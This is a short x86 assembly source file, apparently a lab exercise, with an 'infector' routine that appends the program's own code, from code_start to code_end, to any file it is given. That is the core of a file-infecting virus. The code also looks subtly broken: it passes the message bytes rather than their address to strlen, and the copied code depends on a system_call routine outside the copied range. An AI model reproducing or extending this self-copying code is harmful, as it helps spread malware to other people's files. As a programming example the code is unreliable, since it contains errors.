CLOSE EQU 6
WRITE EQU 4
OPEN EQU 5
STDOUT EQU 1

section .data
    hello_msg db "Hello, Infected File", 0xA ; Message to print
    hello_len equ $ - hello_msg              ; Length of the message

section .text
global infection
global infector
global code_start
global code_end
extern strlen

code_start:

infection:
    ; Print "Hello, Infected File" using a single system call
    push dword [hello_msg]
    call strlen
    add esp, 4
    mov edx, eax ; length of the message
    mov eax, WRITE         ; sys_write
    mov ebx, STDOUT        ; file descriptor 1 (stdout)
    mov ecx, hello_msg     ; pointer to the message
    push edx
    push ecx
    push ebx
    push eax
    call system_call
    ret

infector:
    ; Function to append code from code_start to code_end to a file
    ; Argument: pointer to the filename in ecx

    ; Open the file for appending
    mov eax, OPEN        ; sys_open
    mov ebx, ecx         ; pointer to the filename
    mov ecx, 0x401       ; O_WRONLY | O_APPEND
    mov edx, 0x1B6       ; 0666 permissions
    int 0x80             ; make the system call
    test eax, eax
    js infector_error
    mov ebx, eax         ; store the file descriptor

    ; Write the code from code_start to code_end to the file
    mov eax, WRITE       ; sys_write
    mov ecx, code_start  ; pointer to the start of the code
    mov edx, code_end - code_start ; length of the code
    int 0x80             ; make the system call
    test eax, eax
    js infector_error

    ; Close the file
    mov eax, CLOSE       ; sys_close
    int 0x80             ; make the system call
    ret

infector_error:
    ; Handle error (optional)
    ret

code_end:

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Make the system call

    popad                   ; Restore caller state
    mov     esp, ebp
    pop     ebp
    ret